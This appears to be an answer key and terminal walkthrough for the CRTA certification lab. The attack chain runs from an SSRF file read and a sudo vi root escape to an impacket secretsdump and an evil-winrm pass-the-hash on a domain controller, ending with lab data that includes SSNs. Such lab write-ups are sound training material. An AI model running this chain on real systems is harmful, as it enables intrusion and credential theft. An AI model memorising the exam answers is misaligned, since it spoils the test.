## CRTA

#### Q: TCP port of the Initial access machine which hosts monitoring software
Answer: `8091`
#### Q: Hostname of the initial access machine (Example : Case sensitive)
Answer: `app-server`
#### Q: Web File which reveals sensitive information (Example : Case sensitive)
Answer: `dummy.css`
#### Q: AWS Key value found in the exposed file
Answer: `AKIAIOSFODNN7EXAMPLE`
#### Q: Working password of “HotHost” web application
Answer: `Very3stroungPassword`
#### Q: Role of “admin” user in the “HotHost” web application (Example : Case sensitive)
Answer: `admin`
#### Q: TCP Port which is provisioned for system file monitoring
Answer: `23100`
#### Q: Complete URL with which hosts system “passwd” can be read (Example : http://IP:port/location?function=file:///location/etc/passwd)
Answer: `http://172.26.10.11:23100/fetch?url=file:///hostfs/etc/passwd`
#### Q: What’s the User ID of the “app-admin”
Answer: `1000`
#### Q: Commands that “app-admin” can run on the initial access machine (Example : Mention exact path)
Answer: `/usr/bin/vi`
#### Q: Log file location which discover another network IP address (Example : Mention exact path i.e. /tmp/file.log)
Answer: `/var/log/auth.log`
#### Q: The service version name running on web port on the discovered ip address (Enter the version only : 3.2.1)
Answer: `2.4.58`
#### Q: Route in the discovered IP address which provides access to the system files (Example : Do not provide forward slash, Case sensitive))
Answer: `elfinder`
#### Q: What is the password of the sync_user
Answer: `Summer@2025`
#### Q: What is the NT hash of the Domain Administrator
Answer: `3d15cb1141d579823f8bb08f1f23e316`
#### Q: What is the hostname of the domain controller (Example : Case sensitive)
Answer: `ENT-DC`
#### Q: Directory location in the domain controller which contains the sensitive xml file (Example : C:\Windows\System32)
Answer: `C:\Users\Administrator\Desktop`
#### Q: What is the SSN number of the user “Christopher A. Whitaker”
Answer: `550-12-8421`

----------
#### Q: Web directory with which reveals sensitive information (Example: Case sensitive) 
Answer: `assets`
#### Q: Base64 hash of db-pass credentials 
Answer: `REJfUEBzc3cwcmQh`
#### Q: Web application route which reveals the system files (Example: /route, do not include forward slash) 
Answer: `pug` 
#### Q: What is the “secretToken” string which is present in the above route (Example: Case sensitive)
Answer: `Monitor the system files` 
#### Q: Payload through which hosts system “passwd” file can be read (Example: file:///location/passwd) 
Answer: `file:///hostfs/etc/passwd` 
#### Q: Discovered credentials of “app-admin” 
Answer: `@dmin@123` 
#### Q: Commands that “app-admin” can run on the initial access machine (Example: Mention exact path like /etc/passwd) 
Answer: `/usr/bin/vi` 
#### Q: IP Address discovered from the log file 
Answer: `10.10.10.20` 

-----------
### Instruction
Hope you are doing well & are ready for the examination.
Initial Access SCOPE of Engagement:
172.26.10.0/24 [ONLY 172.26.10.1 is out of scope]
Please note that you may discover additional internal networks, use that in scope sticking to the objective i.e to retrieve the "secret.xml" file.

```linux
┌──(kali㉿kali)-[~]
└─$ nmap -sn 172.26.10.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 09:46 -0500
Nmap scan report for 172.26.10.1
Host is up (0.35s latency).
Nmap scan report for 172.26.10.11
Host is up (0.36s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 23.02 seconds

┌──(kali㉿kali)-[~]
└─$ nmap -Pn -sTV -T4 -p- 172.26.10.11 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 09:51 -0500
Nmap scan report for 172.26.10.11
Host is up (0.36s latency).
Not shown: 65154 closed tcp ports (conn-refused), 378 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
8091/tcp  open  http    Node.js Express framework
23100/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.9.22)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5424.97 seconds

┌──(kali㉿kali)-[~]
└─$ curl http://172.26.10.11:23100/
Access denied. Only the /fetch route with 'url' parameter is allowed. Example: /fetch?url=file:///<location>, To Access Host files go with 'hostfs' path                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ curl http://172.26.10.11:23100//fetch?url=file:///hostfs/etc/passwd
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
app-admin:x:1000:1000:@dmin@123:/home/app-admin:/bin/bash
dnsmasq:x:999:65534:dnsmasq:/var/lib/misc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ssh app-admin@172.26.10.11
app-admin@172.26.10.11's password: @dmin@123
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-60-generic x86_64)

 System information as of Mon Jan  5 05:08:16 PM UTC 2026

  System load:  0.04              Processes:              189
  Usage of /:   77.8% of 9.75GB   Users logged in:        2
  Memory usage: 16%               IPv4 address for ens32: 172.26.10.11
  Swap usage:   0%

Last login: Mon Jan  5 16:20:19 2026 from 192.168.90.94
app-admin@app-server:~$ whoami
app-admin
app-admin@app-server:~$ sudo vi -c ':!/bin/sh' /dev/null
[sudo] password for app-admin: 

# whoami
root

# cd /www/hothostdata 
# ls
hothost.json  process
# cat hothost.json
{
  "users": [
    {
      "id": "07643590-1aea-4de3-91ec-8881600cc54c",
      "username": "admin",
      "password": "665a26fad71ea9ef3edf5f33195d4b31",
      "createdAt": "Mon May 12 2025"
    }
  ],
  "monitoringData": [],
  "httpMonitoringData": [],
  "settings": {
    "RAM_THRESHOLD": 90,
    "RAM_STABILIZATION_LEVEL": 3,
    "DISK_THRESHOLD": 90,
    "DISK_STABILIZATION_LEVEL": 1,
    "HOST_IS_DOWN_CONFIRMATIONS": 1,
    "HTTP_ISSUE_CONFIRMATION": 1,
    "DAYS_FOR_SSL_EXPIRED": 14,
    "HOURS_FOR_NEXT_ALERT": 12
  },
  "pluginSettings": []
}# 
#
# grep -Rni "aws-key" / 2>/dev/null
/root/hot/server/frontend/public/assets/dummy.css:15:  --aws-key: "AKIAIOSFODNN7EXAMPLE";
/root/hot/server/frontend/src/dummy.css:15:  --aws-key: "AKIAIOSFODNN7EXAMPLE";
^C
# cat /root/hot/server/frontend/public/assets/dummy.css
/* WARNING: This is a dummy CSS file with fake credentials - DO NOT USE IN PRODUCTION! */
.login-form {
  background-color: #f0f0f0;
  padding: 20px;
}

/* Fake credentials (for testing only) */

#username::placeholder { content: "admin"; }
#password::placeholder { content: "P@ssw0rd123!"; } /* Change to Very3stroungPassword */
/* API keys (example only - never store real keys in CSS!) */

.api-key-example {
  --stripe-key: "pk_test_51FakeKey1234567890abc";
  --aws-key: "AKIAIOSFODNN7EXAMPLE";
}

/* Database connection (mock) */

.db-connection {
  /* host:port */

  --db-url: "jdbc:mysql://127.0.0.1:3306";
  --db-user: "db_admin";
  --db-pass: "DB_P@ssw0rd!";
}
# cat /root/hot/server/frontend/src/dummy.css
/* WARNING: This is a dummy CSS file with fake credentials - DO NOT USE IN PRODUCTION! */
.login-form {
  background-color: #f0f0f0;
  padding: 20px;
}

/* Fake credentials (for testing only) */

#username::placeholder { content: "admin"; }
#password::placeholder { content: "P@ssw0rd123!"; } /* Change to Very3stroungPassword */
/* API keys (example only - never store real keys in CSS!) */

.api-key-example {
  --stripe-key: "pk_test_51FakeKey1234567890abc";
  --aws-key: "AKIAIOSFODNN7EXAMPLE";
}

/* Database connection (mock) */

.db-connection {
  /* host:port */

  --db-url: "jdbc:mysql://127.0.0.1:3306";
  --db-user: "db_admin";
  --db-pass: "DB_P@ssw0rd!";
}
# 


# cd /home/app-admin
# ls -a
.  ..  .bash_history  .bash_logout  .bashrc  .cache  .local  .profile  .ssh  .sudo_as_admin_successful
# cat .bash_history
ls
cd /var/log/
ls
nano auth.log
ping 172.26.10.201
ping 10.10.10.20
ls
nano auth.log
sudo nano auth.log
sudo vi auth.log
cd
nano .bash_history 
exit
su -
docker container ls
priv
sudo vi -c ':!/bin/sh' /dev/null
pwd
sudo vi -c ':!/bin/sh' /dev/null
whoami
sudo vi -c ':!/bin/sh' /dev/null
su admin
sudo su
exit
# 



┌──(kali㉿kali)-[~]
└─$ nmap -sTV 10.10.10.100 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-05 12:53 -0500
Nmap scan report for 10.10.10.100
Host is up (0.49s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
53/tcp   open     domain        Simple DNS Plus
88/tcp   open     kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-05 18:05:04Z)
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ent.corp, Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds?
464/tcp  open     kpasswd5?
593/tcp  open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open     tcpwrapped
3268/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: ent.corp, Site: Default-First-Site-Name)
3269/tcp open     tcpwrapped
3389/tcp filtered ms-wbt-server
5357/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: ENT-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 725.43 seconds


┌──(kali㉿kali)-[~]
└─$ dirsearch -u 10.10.10.20

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/reports/_10.10.10.20/_26-01-05_13-06-11.txt

Target: http://10.10.10.20/

[13:06:12] Starting:
[13:07:39] 200 -  701B  - /elfinder/
[13:07:53] 200 -   23KB - /info.php
                                                                             
Task Completed                                                                                                                                                                                                                              

┌──(kali㉿kali)-[~]
└─$ curl http://10.10.10.20/elfinder/files/                
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /elfinder/files</title>
 </head>
 <body>
<h1>Index of /elfinder/files</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/elfinder/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="AD_Resources.txt">AD_Resources.txt</a></td><td align="right">2025-05-19 11:18  </td><td align="right">346 </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.58 (Ubuntu) Server at 10.10.10.20 Port 80</address>
</body></html>

┌──(kali㉿kali)-[~]
└─$ curl http://10.10.10.20/elfinder/files/AD_Resources.txt
#Active Directory Sync Service Credentials:

Purpose: Password synchronization between on-prem AD and cloud services (Azure AD Connect).
Service Account: sync_user@ent.corp
Password: Summer@2025

#Security Notes:
  Syncs password hashes to Azure AD (if hybrid environment).
  Critical: Restrict to least privilege (e.g., deny interactive login).


┌──(kali㉿kali)-[~/Desktop]
└─$ impacket-secretsdump ent/sync_user:'Summer@2025'@ent.corp
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3d15cb1141d579823f8bb08f1f23e316:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:36405f88da713c31bbff52e57aea1f86:::ent.corp\
sync_user:1103:aad3b435b51404eeaad3b435b51404ee:e58b89915ba50f299b4bb10325894f91:::
ENT-DC$:1000:aad3b435b51404eeaad3b435b51404ee:29086549a2f67233ccf3f447256f64dd:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:992f0f89c2eec235f94d01103043a3626f1a54e5adc45280ebe58d0883dc294e
Administrator:aes128-cts-hmac-sha1-96:c3c88d0395d8c7e93039108279fa3cb9
Administrator:des-cbc-md5:ad9de62585018c5b
krbtgt:aes256-cts-hmac-sha1-96:1b161ecb048ed49498658525fea07d4278aeab4c8d60ee32e6a61392d14ec924
krbtgt:aes128-cts-hmac-sha1-96:61a3167db44973b38e6ea0ddb9f3f07d
krbtgt:des-cbc-md5:37ad9e49e3ea0b52
ent.corp\sync_user:aes256-cts-hmac-sha1-96:73ae7f5121e08ef5224bf82c941db87bf14ce5bf0bc3c0805b95485885db511f
ent.corp\sync_user:aes128-cts-hmac-sha1-96:72f6b128b62adb5cf0347e8655f41afc
ent.corp\sync_user:des-cbc-md5:377615f8b9106445
ENT-DC$:aes256-cts-hmac-sha1-96:467c04090e14f145e83e442c21fc2066c67e84433d0bad40ff6104ba032333b5
ENT-DC$:aes128-cts-hmac-sha1-96:732407b10baf81e379c7c2f6b8ae8a3b
ENT-DC$:des-cbc-md5:3446e6cd9e8015ba
[*] Cleaning up...


┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.10.10.100 -u Administrator -H 3d15cb1141d579823f8bb08f1f23e316
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/19/2025   5:02 AM           1553 secret.xml.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type secret.xml.txt
<?xml version="1.0" encoding="UTF-8"?>
<Employees>
  <!-- PROTECTED: Contains sensitive employee information - RESTRICT ACCESS -->
  <Employee security-clearance="confidential">
    <ID>E-4281</ID>
    <FullName>Christopher A. Whitaker</FullName>
    <GovernmentID type="SSN">550-12-8421</GovernmentID>
    <Position>Lead Security Architect</Position>
    <Compensation>
      <BaseSalary currency="USD">142000</BaseSalary>
      <Bonus eligibility="true">15000</Bonus>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <RSA-4096>
          <Fingerprint>SHA256:zT4Gp2K9...V3jH91</Fingerprint>
          <PublicKey>ssh-rsa AAAAB3Nza...9Px8= secure-shell@corp</PublicKey>
          <LastRotated>2024-03-15T08:42:11Z</LastRotated>
        </RSA-4096>
      </SSHKeys>
      <LastMultiFactorAuth>2024-05-20T14:22:07Z</LastMultiFactorAuth>
    </AccessCredentials>
  </Employee>

  <Employee security-clearance="restricted">
    <ID>E-9173</ID>
    <FullName>Danielle M. Chen</FullName>
    <GovernmentID type="SSN">367-88-4102</GovernmentID>
    <Position>Director of Engineering</Position>
    <Compensation>
      <BaseSalary currency="USD">189500</BaseSalary>
      <Equity>2500</Equity>
    </Compensation>
    <AccessCredentials>
      <SSHKeys>
        <Ed25519>
          <Fingerprint>SHA256:7bNq1Rc...YtF62</Fingerprint>
          <PublicKey>ssh-ed25519 AAAAC3N...Vdv2= admin-access@corp</PublicKey>
        </Ed25519>
      </SSHKeys>
    </AccessCredentials>
  </Employee>
</Employees>
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
